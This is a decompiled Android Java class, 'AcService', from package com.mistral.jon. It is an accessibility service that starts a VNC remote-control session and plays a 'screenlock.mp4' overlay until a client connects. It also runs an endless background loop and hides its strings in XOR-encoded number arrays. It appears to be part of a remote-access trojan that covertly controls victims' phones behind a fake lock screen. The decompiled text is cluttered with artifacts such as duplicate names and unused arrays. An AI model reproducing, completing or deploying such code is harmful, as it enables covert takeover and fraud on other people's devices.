package com.mistral.jon.services.a11y;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import com.mistral.jon.activity.UscActivity;
import com.mistral.jon.receivers.UnlockScreenReceiver;
import com.mistral.jon.receivers.UserPresentReceiver;
import com.mistral.jon.services.VncService;
import de.abr.android.avnc.lib.LvWrapper.a;
import de.abr.android.avnc.lib.LvWrapper;
import z.ayp;
import z.azb;
import z.azc;
import z.azf;
import z.azg;
import z.azh;
import z.azs;
import z.bbc;
import z.bcq;
import z.bct;
import z.bcu;
import z.bcx;
import z.bdc;

public class AcService extends AccessibilityService implements a {
    public static AcService a = null;
    private static final String a = "AcService";
    private static long[] a;
    private SharedPreferences a;
    private final UnlockScreenReceiver a;
    private UserPresentReceiver a;
    private Thread a;
    private final ayp a;
    private azc a;
    public bdc a;

    static {
        long[] arr_v = new long[61];
        AcService.a = arr_v;
        arr_v[0] = 120503036L;
        arr_v[1] = 0x4B13C438L;
        arr_v[2] = 488868017L;
        arr_v[3] = 0x69D55E50L;
        arr_v[4] = 0x4BF613EDL;
        arr_v[5] = 1483024994L;
        arr_v[6] = -360042051L;
        arr_v[7] = 0x373AFC99L;
        arr_v[8] = 0x5F825F30L;
        arr_v[9] = 0xFFFFFFFF8F936A32L;
        arr_v[10] = 0x5E6D2803L;
        arr_v[11] = 0x9460CE9L;
        arr_v[12] = 0xFFFFFFFFA10A33B8L;
        arr_v[13] = 1484036823L;
        arr_v[14] = 0xFFFFFFFFE4C0E7C4L;
        arr_v[15] = 914220931L;
        arr_v[16] = 0x6D0C50C0L;
        arr_v[17] = 0x349C70EAL;
        arr_v[18] = 0xFFFFFFFFF01CCFAAL;
        arr_v[19] = 0x1F7A87B8L;
        arr_v[20] = 0x6B8B3F62L;
        arr_v[21] = 1091609463L;
        arr_v[22] = 0xFFFFFFFFB182902CL;
        arr_v[23] = 0x49CF8CDEL;
        arr_v[24] = 0xFFFFFFFFDBB9E231L;
        arr_v[25] = 1010403788L;
        arr_v[26] = 0x6961F4B3L;
        arr_v[27] = 0x2587F33AL;
        arr_v[28] = -507209314L;
        arr_v[29] = 0x49714EC0L;
        arr_v[30] = 0x5640FBEAL;
        arr_v[0x1F] = 0x49E25E4FL;
        arr_v[0x20] = 998575006L;
        arr_v[33] = 0x5EE5F4BBL;
        arr_v[34] = 0x61B85D00L;
        arr_v[35] = 0x7AE16F1BL;
        arr_v[36] = 0x5383B2AFL;
        arr_v[37] = 0x36E85BACL;
        arr_v[38] = 0xDF7BCDBL;
        arr_v[39] = 0x14C13EAFL;
        arr_v[40] = 0x7EE8AD5CL;
        arr_v[41] = 0x1BAFF969L;
        arr_v[42] = 0x576D679L;
        arr_v[43] = 0x1C1ABB39L;
        arr_v[44] = 0x2031EC96L;
        arr_v[45] = 1697350974L;
        arr_v[46] = 2014406005L;
        arr_v[0x2F] = 0x130F3A3AL;
        arr_v[0x30] = 334250375L;
        arr_v[49] = 896634034L;
        arr_v[50] = 0x73524BCDL;
        arr_v[51] = 0x38E2447BL;
        arr_v[52] = 0xBC35200L;
        arr_v[53] = 107507817L;
        arr_v[54] = 0x7E6FB6B2L;
        arr_v[55] = 0x7F8D28E9L;
        arr_v[56] = 590077912L;
        arr_v[57] = 0x38EBF71CL;
        arr_v[58] = 1234446700L;
        arr_v[59] = 28810049L;
        arr_v[60] = 728500859L;
    }

    public AcService() {
        this.a = ayp.a();
        this.a = new UnlockScreenReceiver();
        this.a = new UserPresentReceiver();
        this.a = new Thread(() -> {
            while(true) {
                azb.a(this);
                try {
                    Thread.sleep(AcService.a[60] ^ 728500627L);
                    continue;
                }
                catch(InterruptedException interruptedException0) {
                }
                break;
            }
            throw new RuntimeException(interruptedException0);
        });
    }

    // Detected as a lambda implementation
    private void a() [...]

    @Override  // de.abr.android.avnc.lib.LvWrapper$a
    public void a(AccessibilityEvent accessibilityEvent0) {
        this.a.b(accessibilityEvent0);
    }

    @Override  // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent0) {
        azh.a(new azg() {
            final AcService a;

            @Override
            public void run() {
                Looper.prepare();
                try {
                    AcService.this.a.b(AccessibilityEvent.obtain(accessibilityEvent0));
                }
                catch(Exception exception0) {
                    exception0.printStackTrace();
                }
                try {
                    AccessibilityEvent.obtain(accessibilityEvent0).recycle();
                }
                catch(Exception exception1) {
                    exception1.printStackTrace();
                }
                Looper.loop();
            }
        });
    }

    @Override  // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.a.a(this);
    }

    @Override  // android.app.Service
    public void onDestroy() {
        this.a.c();
        this.a.b(this);
        super.onDestroy();
    }

    @Override  // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
    }

    @Override  // android.accessibilityservice.AccessibilityService
    public void onServiceConnected() {
        LvWrapper.getInstance().acCallback = this;
        AcService.a = this;
        this.a.b();
        this.a = bcq.a(this);
        if(bct.f() && this.a.getBoolean("vnc_enabled", ((boolean)(((int)AcService.a[0]) ^ 120503036)))) {
            UscActivity.a(this, ((boolean)(((int)AcService.a[0]) ^ 120503036)), "", ((int)AcService.a[0]) ^ 120503036);
            this.a.edit().putBoolean("vnc_enabled", ((boolean)(((int)AcService.a[0]) ^ 120503036))).apply();
        }
        long[] arr_v = AcService.a;
        byte[] arr_b = new byte[((int)arr_v[1]) ^ 0x4B13C418];
        arr_b[120503036 ^ ((int)arr_v[0])] = ((int)arr_v[2]) ^ 488867980;
        arr_b[((int)arr_v[3]) ^ 1775590993] = ((int)arr_v[4]) ^ 0x4BF613F8;
        arr_b[((int)arr_v[5]) ^ 0x58652A60] = ((int)arr_v[6]) ^ 360042088;
        arr_b[((int)arr_v[7]) ^ 0x373AFC9A] = ((int)arr_v[8]) ^ 0x5F825F78;
        arr_b[4] = ((int)arr_v[9]) ^ 0x706C95CA;
        arr_b[5] = ((int)arr_v[10]) ^ 1584212075;
        arr_b[((int)arr_v[11]) ^ 0x9460CEF] = ((int)arr_v[12]) ^ 0x5EF5CC71;
        arr_b[((int)arr_v[13]) ^ 0x58749AD0] = ((int)arr_v[14]) ^ 0x1B3F184A;
        arr_b[((int)arr_v[15]) ^ 914220939] = ((int)arr_v[16]) ^ 0x6D0C5095;
        arr_b[((int)arr_v[17]) ^ 0x349C70E3] = ((int)arr_v[18]) ^ 0xFE3302F;
        arr_b[((int)arr_v[19]) ^ 0x1F7A87B2] = ((int)arr_v[20]) ^ 0x6B8B3F4E;
        arr_b[((int)arr_v[21]) ^ 1091609468] = ((int)arr_v[22]) ^ 0x4E7D6FFB;
        arr_b[((int)arr_v[23]) ^ 0x49CF8CD2] = ((int)arr_v[24]) ^ 608574918;
        arr_b[((int)arr_v[25]) ^ 1010403777] = ((int)arr_v[26]) ^ 1768027305;
        arr_b[((int)arr_v[27]) ^ 0x2587F334] = ((int)arr_v[28]) ^ 507209251;
        arr_b[((int)arr_v[29]) ^ 0x49714ECF] = ((int)arr_v[30]) ^ 0x5640FBD2;
        arr_b[((int)arr_v[0x1F]) ^ 0x49E25E5F] = ((int)arr_v[0x20]) ^ 0x3B850BD0;
        arr_b[((int)arr_v[33]) ^ 0x5EE5F4AA] = ((int)arr_v[34]) ^ 0x61B85D4D;
        arr_b[((int)arr_v[35]) ^ 0x7AE16F09] = ((int)arr_v[36]) ^ 0x5383B2F7;
        arr_b[((int)arr_v[37]) ^ 0x36E85BBF] = ((int)arr_v[38]) ^ 0xDF7BCEE;
        arr_b[((int)arr_v[39]) ^ 348208827] = ((int)arr_v[40]) ^ 0x7EE8AD0B;
        arr_b[((int)arr_v[4]) ^ 0x4BF613F8] = ((int)arr_v[41]) ^ 0x1BAFF911;
        arr_b[((int)arr_v[42]) ^ 0x576D66F] = ((int)arr_v[43]) ^ 0x1C1ABB00;
        arr_b[((int)arr_v[44]) ^ 0x2031EC81] = ((int)arr_v[45]) ^ 1697350920;
        arr_b[((int)arr_v[46]) ^ 2014405997] = ((int)arr_v[0x2F]) ^ 0x130F3A49;
        arr_b[((int)arr_v[0x30]) ^ 334250398] = ((int)arr_v[49]) ^ 896634067;
        arr_b[((int)arr_v[26]) ^ 1768027305] = ((int)arr_v[50]) ^ 0x73524B89;
        arr_b[((int)arr_v[51]) ^ 0x38E24460] = ((int)arr_v[52]) ^ 0xBC3526B;
        arr_b[((int)arr_v[53]) ^ 107507829] = ((int)arr_v[50]) ^ 0x73524B89;
        arr_b[((int)arr_v[54]) ^ 0x7E6FB6AF] = ((int)arr_v[55]) ^ 0x7F8D2887;
        arr_b[((int)arr_v[56]) ^ 590077894] = ((int)arr_v[57]) ^ 0x38EBF773;
        arr_b[((int)arr_v[58]) ^ 1234446707] = ((int)arr_v[59]) ^ 28810029;
        this.a = new bdc(this, "screenlock.mp4");
        this.a.a(this);
        this.a = new bcu(this);
        VncService.a(new com.mistral.jon.services.VncService.a() {
            private static long[] a;
            final AcService a;

            {
                long[] arr_v = new long[170];
                com.mistral.jon.services.a11y.AcService.1.a = arr_v;
                arr_v[0] = 0x1BAF4618L;
                arr_v[1] = 0x6AAC67A7L;
                arr_v[2] = 750400844L;
                arr_v[3] = 0x400E6429L;
                arr_v[4] = 0xFFFFFFFFB70362F7L;
                arr_v[5] = 0x663068ABL;
                arr_v[6] = 830689108L;
                arr_v[7] = 0x1F87D046L;
                arr_v[8] = 0xFFFFFFFFB51F103BL;
                arr_v[9] = 0x585D92F7L;
                arr_v[10] = 0x4A045267L;
                arr_v[11] = 0x4B25299FL;
                arr_v[12] = 0x5BE7F331L;
                arr_v[13] = 0x153A9F8EL;
                arr_v[14] = 1456813640L;
                arr_v[15] = 0xC54FA89L;
                arr_v[16] = 0xFFFFFFFFB01200F5L;
                arr_v[17] = 0x1FA1ACE4L;
                arr_v[18] = 0xFFFFFFFFFC6270FBL;
                arr_v[19] = 0x75328A5EL;
                arr_v[20] = 0x17579941L;
                arr_v[21] = 0x27931C9AL;
                arr_v[22] = 0xFFFFFFFFCBD1E8DCL;
                arr_v[23] = 0xFFFFFFFFFE0549B6L;
                arr_v[24] = 1406353303L;
                arr_v[25] = 0x565C02A6L;
                arr_v[26] = 0x45AB5CBAL;
                arr_v[27] = 0x75E82731L;
                arr_v[28] = 0x2F489D6BL;
                arr_v[29] = 0x6DC508B4L;
                arr_v[30] = -911852109L;
                arr_v[0x1F] = 0x66FB9784L;
                arr_v[0x20] = 0x7460EA48L;
                arr_v[33] = 0xFFFFFFFFF5553FDDL;
                arr_v[34] = 0x6D24B4D5L;
                arr_v[35] = 0x7A8DF880L;
                arr_v[36] = 382134508L;
                arr_v[37] = -959353106L;
                arr_v[38] = 2071890744L;
                arr_v[39] = 0x5B556D65L;
                arr_v[40] = 1014597587L;
                arr_v[41] = 0x413F7CCAL;
                arr_v[42] = 0x46542B81L;
                arr_v[43] = 0x45E326BEL;
                arr_v[44] = 0xFFFFFFFF900D2E20L;
                arr_v[45] = 0x4FAC1AC1L;
                arr_v[46] = 0xFFFFFFFFCAD8CF53L;
                arr_v[0x2F] = 0x31AF5C2DL;
                arr_v[0x30] = -890598808L;
                arr_v[49] = 241390642L;
                arr_v[50] = 0x6292E95DL;
                arr_v[51] = 1940498599L;
                arr_v[52] = -2070795643L;
                arr_v[53] = 0x2C1F7AF5L;
                arr_v[54] = 1395403024L;
                arr_v[55] = 0x71744E0L;
                arr_v[56] = 335026050L;
                arr_v[57] = 0x508F82AFL;
                arr_v[58] = 208767770L;
                arr_v[59] = 0x4F6DAEE2L;
                arr_v[60] = 1307278749L;
                arr_v[61] = 2018261571L;
                arr_v[62] = 0x5D0157F7L;
                arr_v[0x3F] = 0x30EF6ECEL;
                arr_v[0x40] = 1571007842L;
                arr_v[65] = 665029591L;
                arr_v[66] = 0x7323ED10L;
                arr_v[67] = 0x2F39D0F8L;
                arr_v[68] = 1296264308L;
                arr_v[69] = 0x62A1DFA2L;
                arr_v[70] = 0x2A8D2867L;
                arr_v[71] = 0x2BCD7CF6L;
                arr_v[72] = 0x14B8D07CL;
                arr_v[73] = 1004661287L;
                arr_v[74] = 0xBA4DAE9L;
                arr_v[75] = 0x48090793L;
                arr_v[76] = 0x65018B3CL;
                arr_v[77] = 1286423022L;
                arr_v[78] = 0x4D4E1770L;
                arr_v[0x4F] = 1831577900L;
                arr_v[80] = 0x498E9F57L;
                arr_v[81] = 1140605626L;
                arr_v[82] = 0x1FA6A6ADL;
                arr_v[83] = -2061987038L;
                arr_v[84] = 0x5116ABFL;
                arr_v[85] = 0x4D09E079L;
                arr_v[86] = 0xFFFFFFFF91CC62DAL;
                arr_v[87] = -1961708225L;
                arr_v[88] = 0xFFFFFFFFF68F7591L;
                arr_v[89] = -2040014306L;
                arr_v[90] = 0x1005B091L;
                arr_v[91] = 0xFFFFFFFFD92D3D3CL;
                arr_v[92] = -1405207757L;
                arr_v[93] = -567036055L;
                arr_v[94] = 0xFFFFFFFFD3D07B65L;
                arr_v[0x5F] = 0x3AD7A015L;
                arr_v[0x60] = 1301203430L;
                arr_v[97] = 0x4FD55366L;
                arr_v[98] = 0xFFFFFFFF8DEE365FL;
                arr_v[99] = 478922042L;
                arr_v[100] = 0xFFFFFFFFF902DA1DL;
                arr_v[101] = 1988001527L;
                arr_v[102] = 0xFFFFFFFFDCDB59F9L;
                arr_v[103] = 390063316L;
                arr_v[104] = 508460921L;
                arr_v[105] = 0x477E8B7FL;
                arr_v[106] = 0x64A387A0L;
                arr_v[107] = 0x66A94207L;
                arr_v[108] = 0x1734C176L;
                arr_v[109] = 0x4AE76EE3L;
                arr_v[110] = 0x32780F96L;
                arr_v[0x6F] = 0xD4FABBFL;
                arr_v[0x70] = 675707955L;
                arr_v[0x71] = -682484107L;
                arr_v[0x72] = 0xFFFFFFFFBC6D80E5L;
                arr_v[0x73] = 0x315DF8CBL;
                arr_v[0x74] = 0xFFFFFFFF8EE591F8L;
                arr_v[0x75] = 0x55F66817L;
                arr_v[0x76] = 0xFFFFFFFFA1D66FE9L;
                arr_v[0x77] = 0x6860864BL;
                arr_v[120] = 2094379428L;
                arr_v[0x79] = 0xFFFFFFFFC6326233L;
                arr_v[0x7A] = 1036083937L;
                arr_v[0x7B] = 0x3A824197L;
                arr_v[0x7C] = 1910950031L;
                arr_v[0x7D] = 0xFFFFFFFF8DB45FC6L;
                arr_v[0x7E] = -1022930095L;
                arr_v[0x7F] = 0xFFFFFFFF92F0111AL;
                arr_v[0x80] = 0xFFFFFFFFD71FBAC2L;
                arr_v[0x81] = 0x3FFEA0F6L;
                arr_v[130] = 0xFFFFFFFFBC6AF1B9L;
                arr_v[0x83] = 1402110402L;
                arr_v[0x84] = 1418231208L;
                arr_v[0x85] = 0x77F6BB55L;
                arr_v[0x86] = 0x51BAFFC1L;
                arr_v[0x87] = -1909226395L;
                arr_v[0x88] = 0x30E05408L;
                arr_v[0x89] = 0xFFFFFFFFD2F2ACFEL;
                arr_v[0x8A] = 0xFFFFFFFFB6B48935L;
                arr_v[0x8B] = 0xFFFFFFFFDB8CA271L;
                arr_v[140] = -1153023718L;
                arr_v[0x8D] = 0xFFFFFFFF9EDBA055L;
                arr_v[0x8E] = 0xFFFFFFFF925704CEL;
                arr_v[0x8F] = 0x9BD5F41L;
                arr_v[0x90] = 0x5A17574EL;
                arr_v[0x91] = 1530797085L;
                arr_v[0x92] = 0x7247838EL;
                arr_v[0x93] = 0xFFFFFFFFF9133F8BL;
                arr_v[0x94] = 0xFFFFFFFFF06723C0L;
                arr_v[0x95] = 0xFFFFFFFFCA6C2FC1L;
                arr_v[150] = 0xFFFFFFFFB2F9E716L;
                arr_v[0x97] = 0xFFFFFFFFF7FAD801L;
                arr_v[0x98] = 0xFFFFFFFF8AB2CD2DL;
                arr_v[0x99] = 0xFFFFFFFFE8A5A103L;
                arr_v[0x9A] = 0x6806D1CBL;
                arr_v[0x9B] = 0x7FEC9C06L;
                arr_v[0x9C] = 0x600109DEL;
                arr_v[0x9D] = -2060291700L;
                arr_v[0x9E] = 0xFFFFFFFFF8D692FBL;
                arr_v[0x9F] = 0xFFFFFFFFFF7F3176L;
                arr_v[0xA0] = 0xFFFFFFFFDFD60F92L;
                arr_v[0xA1] = 0xFFFFFFFF8278FF9FL;
                arr_v[0xA2] = 0xFFFFFFFF9EE9A624L;
                arr_v[0xA3] = 0xFFFFFFFFF33D7DF8L;
                arr_v[0xA4] = 0xFFFFFFFFE07FB802L;
                arr_v[0xA5] = 0xFFFFFFFFB2CBFCA6L;
                arr_v[0xA6] = 0x268BA702L;
                arr_v[0xA7] = 239340502L;
                arr_v[0xA8] = 0x26D719D0L;
                arr_v[0xA9] = 0x558D7708L;
            }

            {
                AcService.this = acService0;
                super();
            }

            @Override  // com.mistral.jon.services.VncService$a
            public void a() {
                VncService.b = true;
                ayp.a().a("Client connected", "VncService");
                bcx bcx0 = new bcx();
                bcx0.a();
                bcx0.c();
                azf.b();
                try {
                    AcService.this.a.stop();
                }
                catch(Exception unused_ex) {
                }
            }

            @Override  // com.mistral.jon.services.VncService$a
            public void a(String s) {
                ayp ayp0 = ayp.a();
                StringBuilder stringBuilder0 = new StringBuilder();
                long[] arr_v = com.mistral.jon.services.a11y.AcService.1.a;
                byte[] arr_b = new byte[((int)arr_v[1]) ^ 1789683607];
                arr_b[((int)arr_v[2]) ^ 750400844] = ((int)arr_v[42]) ^ 1179921305;
                arr_b[((int)arr_v[0]) ^ 0x1BAF4619] = ((int)arr_v[83]) ^ 2061987029;
                arr_b[((int)arr_v[5]) ^ 0x663068A9] = ((int)arr_v[8]) ^ 0x4AE0EF8F;
                arr_b[((int)arr_v[7]) ^ 0x1F87D045] = ((int)arr_v[11]) ^ 1260726681;
                arr_b[4] = ((int)arr_v[84]) ^ 0x5116AF8;
                arr_b[5] = ((int)arr_v[85]) ^ 0x4D09E03C;
                arr_b[((int)arr_v[11]) ^ 1260726681] = ((int)arr_v[86]) ^ 1848876403;
                arr_b[((int)arr_v[13]) ^ 0x153A9F89] = ((int)arr_v[67]) ^ 0x2F39D0DD;
                arr_b[((int)arr_v[15]) ^ 0xC54FA81] = ((int)arr_v[87]) ^ 0x74ED4AFC;
                arr_b[((int)arr_v[17]) ^ 0x1FA1ACED] = ((int)arr_v[88]) ^ 0x9708A37;
                arr_b[((int)arr_v[19]) ^ 0x75328A54] = ((int)arr_v[11]) ^ 1260726681;
                arr_b[((int)arr_v[21]) ^ 0x27931C91] = ((int)arr_v[37]) ^ 0x392E9146;
                arr_b[((int)arr_v[12]) ^ 0x5BE7F33D] = ((int)arr_v[89]) ^ 2040014211;
                arr_b[((int)arr_v[24]) ^ 1406353306] = ((int)arr_v[90]) ^ 0x1005B0C5;
                arr_b[((int)arr_v[26]) ^ 0x45AB5CB4] = ((int)arr_v[91]) ^ 0x26D2C2C8;
                arr_b[((int)arr_v[28]) ^ 0x2F489D64] = ((int)arr_v[92]) ^ 1405207761;
                arr_b[((int)arr_v[29]) ^ 0x6DC508A4] = ((int)arr_v[93]) ^ 567036108;
                arr_b[((int)arr_v[0x1F]) ^ 0x66FB9795] = ((int)arr_v[94]) ^ 0x2C2F84BC;
                arr_b[((int)arr_v[0x20]) ^ 1952508506] = ((int)arr_v[0x5F]) ^ 0x3AD7A05F;
                arr_b[((int)arr_v[34]) ^ 0x6D24B4C6] = ((int)arr_v[0x60]) ^ 1301203352;
                arr_b[((int)arr_v[36]) ^ 0x16C6E8F8] = ((int)arr_v[4]) ^ 0x48FC9D64;
                arr_b[((int)arr_v[38]) ^ 2071890733] = ((int)arr_v[97]) ^ 0x4FD55352;
                arr_b[((int)arr_v[40]) ^ 1014597573] = ((int)arr_v[98]) ^ 0x7211C9B1;
                arr_b[((int)arr_v[41]) ^ 0x413F7CDD] = ((int)arr_v[99]) ^ 478922100;
                arr_b[((int)arr_v[42]) ^ 1179921305] = ((int)arr_v[100]) ^ 0x6FD2583;
                arr_b[((int)arr_v[43]) ^ 0x45E326A7] = ((int)arr_v[0x1F]) ^ 0x66FB9795;
                arr_b[((int)arr_v[45]) ^ 0x4FAC1ADB] = ((int)arr_v[101]) ^ 1988001487;
                arr_b[((int)arr_v[0x2F]) ^ 0x31AF5C36] = ((int)arr_v[102]) ^ 0x2324A66F;
                arr_b[((int)arr_v[49]) ^ 241390638] = ((int)arr_v[103]) ^ 390063282;
                arr_b[((int)arr_v[51]) ^ 1940498618] = ((int)arr_v[65]) ^ 0x27A38BF3;
                arr_b[((int)arr_v[53]) ^ 740260587] = ((int)arr_v[38]) ^ 2071890733;
                arr_b[((int)arr_v[55]) ^ 0x71744FF] = ((int)arr_v[35]) ^ 2056124605;
                arr_b[((int)arr_v[57]) ^ 0x508F828F] = ((int)arr_v[104]) ^ 508460850;
                arr_b[((int)arr_v[59]) ^ 0x4F6DAEC3] = ((int)arr_v[0x5F]) ^ 0x3AD7A05F;
                arr_b[((int)arr_v[61]) ^ 2018261601] = ((int)arr_v[84]) ^ 0x5116AF8;
                arr_b[((int)arr_v[0x3F]) ^ 0x30EF6EED] = ((int)arr_v[105]) ^ 0x477E8B3E;
                arr_b[((int)arr_v[65]) ^ 0x27A38BF3] = ((int)arr_v[106]) ^ 0x64A387D0;
                arr_b[((int)arr_v[67]) ^ 0x2F39D0DD] = ((int)arr_v[107]) ^ 0x66A94252;
                arr_b[((int)arr_v[3]) ^ 0x400E640F] = ((int)arr_v[108]) ^ 0x1734C120;
                arr_b[((int)arr_v[70]) ^ 0x2A8D2840] = ((int)arr_v[109]) ^ 0x4AE76EBB;
                arr_b[((int)arr_v[71]) ^ 0x2BCD7CDE] = ((int)arr_v[110]) ^ 0x32780FF7;
                arr_b[((int)arr_v[72]) ^ 0x14B8D055] = ((int)arr_v[0x6F]) ^ 0xD4FABCC;
                arr_b[((int)arr_v[73]) ^ 1004661261] = ((int)arr_v[0x70]) ^ 675708004;
                arr_b[((int)arr_v[75]) ^ 0x480907B8] = ((int)arr_v[0x70]) ^ 675708004;
                arr_b[((int)arr_v[76]) ^ 0x65018B10] = ((int)arr_v[0x6F]) ^ 0xD4FABCC;
                arr_b[((int)arr_v[78]) ^ 0x4D4E175D] = ((int)arr_v[0x5F]) ^ 0x3AD7A05F;
                arr_b[((int)arr_v[80]) ^ 1234083705] = ((int)arr_v[0x70]) ^ 675708004;
                arr_b[((int)arr_v[81]) ^ 1140605589] = ((int)arr_v[90]) ^ 0x1005B0C5;
                ayp0.a(stringBuilder0.append("Connected. Address=").append(s).toString(), "VncService");
            }

            @Override  // com.mistral.jon.services.VncService$a
            public void b() {
                VncService.b = false;
                ayp.a().a("Disconnected", "VncService");
                bbc.a(AcService.this).a("vnc").a();
                bcq.a(AcService.this).edit().putString("vnc_address", null).apply();
                new bcx().b();
                azf.a();
                try {
                    AcService.this.a.stop();
                }
                catch(Exception unused_ex) {
                }
            }

            @Override  // com.mistral.jon.services.VncService$a
            public void b(String s) {
                VncService.b = false;
                ayp ayp0 = ayp.a();
                StringBuilder stringBuilder0 = new StringBuilder();
                long[] arr_v = com.mistral.jon.services.a11y.AcService.1.a;
                byte[] arr_b = new byte[((int)arr_v[1]) ^ 1789683607];
                arr_b[((int)arr_v[2]) ^ 750400844] = ((int)arr_v[66]) ^ 0x7323ED61;
                arr_b[((int)arr_v[0]) ^ 0x1BAF4619] = ((int)arr_v[0x71]) ^ 682484102;
                arr_b[((int)arr_v[5]) ^ 0x663068A9] = ((int)arr_v[100]) ^ 0x6FD2583;
                arr_b[((int)arr_v[7]) ^ 0x1F87D045] = ((int)arr_v[10]) ^ 0x4A045209;
                arr_b[4] = ((int)arr_v[0x72]) ^ 0x43927F27;
                arr_b[5] = ((int)arr_v[59]) ^ 0x4F6DAEC3;
                arr_b[((int)arr_v[11]) ^ 1260726681] = ((int)arr_v[0x73]) ^ 0x315DF8A9;
                arr_b[((int)arr_v[13]) ^ 0x153A9F89] = ((int)arr_v[0x74]) ^ 1897557540;
                arr_b[((int)arr_v[15]) ^ 0xC54FA81] = ((int)arr_v[0x75]) ^ 0x55F66826;
                arr_b[((int)arr_v[17]) ^ 0x1FA1ACED] = ((int)arr_v[0x76]) ^ 0x5E29903E;
                arr_b[((int)arr_v[19]) ^ 0x75328A54] = ((int)arr_v[0x77]) ^ 0x68608677;
                arr_b[((int)arr_v[21]) ^ 0x27931C91] = ((int)arr_v[120]) ^ 2094379414;
                arr_b[((int)arr_v[12]) ^ 0x5BE7F33D] = ((int)arr_v[78]) ^ 0x4D4E175D;
                arr_b[((int)arr_v[24]) ^ 1406353306] = ((int)arr_v[25]) ^ 0x565C02EA;
                arr_b[((int)arr_v[26]) ^ 0x45AB5CB4] = ((int)arr_v[0x79]) ^ 0x39CD9DAA;
                arr_b[((int)arr_v[28]) ^ 0x2F489D64] = ((int)arr_v[0x7A]) ^ 1036083922;
                arr_b[((int)arr_v[29]) ^ 0x6DC508A4] = ((int)arr_v[0x7B]) ^ 981615063;
                arr_b[((int)arr_v[0x1F]) ^ 0x66FB9795] = ((int)arr_v[0x7C]) ^ 1910950068;
                arr_b[((int)arr_v[0x20]) ^ 1952508506] = ((int)arr_v[0x7D]) ^ 0x724BA00B;
                arr_b[((int)arr_v[34]) ^ 0x6D24B4C6] = ((int)arr_v[0x7E]) ^ 1022930151;
                arr_b[((int)arr_v[36]) ^ 0x16C6E8F8] = ((int)arr_v[0x74]) ^ 1897557540;
                arr_b[((int)arr_v[38]) ^ 2071890733] = ((int)arr_v[0x7F]) ^ 0x6D0FEEB0;
                arr_b[((int)arr_v[40]) ^ 1014597573] = ((int)arr_v[0x74]) ^ 1897557540;
                arr_b[((int)arr_v[41]) ^ 0x413F7CDD] = ((int)arr_v[0x80]) ^ 0x28E0457C;
                arr_b[((int)arr_v[42]) ^ 1179921305] = ((int)arr_v[0x81]) ^ 0x3FFEA0AD;
                arr_b[((int)arr_v[43]) ^ 0x45E326A7] = ((int)arr_v[9]) ^ 0x585D92C9;
                arr_b[((int)arr_v[45]) ^ 0x4FAC1ADB] = ((int)arr_v[67]) ^ 0x2F39D0DD;
                arr_b[((int)arr_v[0x2F]) ^ 0x31AF5C36] = ((int)arr_v[109]) ^ 0x4AE76EBB;
                arr_b[((int)arr_v[49]) ^ 241390638] = ((int)arr_v[88]) ^ 0x9708A37;
                arr_b[((int)arr_v[51]) ^ 1940498618] = ((int)arr_v[0x2F]) ^ 0x31AF5C36;
                arr_b[((int)arr_v[53]) ^ 740260587] = ((int)arr_v[130]) ^ 0x43950E49;
                arr_b[((int)arr_v[55]) ^ 0x71744FF] = ((int)arr_v[43]) ^ 0x45E326A7;
                arr_b[((int)arr_v[57]) ^ 0x508F828F] = ((int)arr_v[0x83]) ^ 1402110342;
                arr_b[((int)arr_v[59]) ^ 0x4F6DAEC3] = ((int)arr_v[60]) ^ 1307278791;
                arr_b[((int)arr_v[61]) ^ 2018261601] = ((int)arr_v[0x6F]) ^ 0xD4FABCC;
                arr_b[((int)arr_v[0x3F]) ^ 0x30EF6EED] = ((int)arr_v[0x73]) ^ 0x315DF8A9;
                arr_b[((int)arr_v[65]) ^ 0x27A38BF3] = ((int)arr_v[0x84]) ^ 0x54887DE1;
                arr_b[((int)arr_v[67]) ^ 0x2F39D0DD] = ((int)arr_v[109]) ^ 0x4AE76EBB;
                arr_b[((int)arr_v[3]) ^ 0x400E640F] = ((int)arr_v[0x85]) ^ 0x77F6BB04;
                arr_b[((int)arr_v[70]) ^ 0x2A8D2840] = ((int)arr_v[110]) ^ 0x32780FF7;
                arr_b[((int)arr_v[71]) ^ 0x2BCD7CDE] = ((int)arr_v[68]) ^ 1296264220;
                arr_b[((int)arr_v[72]) ^ 0x14B8D055] = ((int)arr_v[0x85]) ^ 0x77F6BB04;
                arr_b[((int)arr_v[73]) ^ 1004661261] = ((int)arr_v[103]) ^ 390063282;
                arr_b[((int)arr_v[75]) ^ 0x480907B8] = ((int)arr_v[0x40]) ^ 1571007753;
                arr_b[((int)arr_v[76]) ^ 0x65018B10] = ((int)arr_v[0x86]) ^ 0x51BAFF8C;
                arr_b[((int)arr_v[78]) ^ 0x4D4E175D] = ((int)arr_v[97]) ^ 0x4FD55352;
                arr_b[((int)arr_v[80]) ^ 1234083705] = ((int)arr_v[90]) ^ 0x1005B0C5;
                arr_b[((int)arr_v[81]) ^ 1140605589] = ((int)arr_v[82]) ^ 0x1FA6A6E5;
                ayp0.a(stringBuilder0.append("Connection failed. Reason=").append(s).toString(), "VncService");
                azs.a(AcService.this);
            }
        });
    }
}

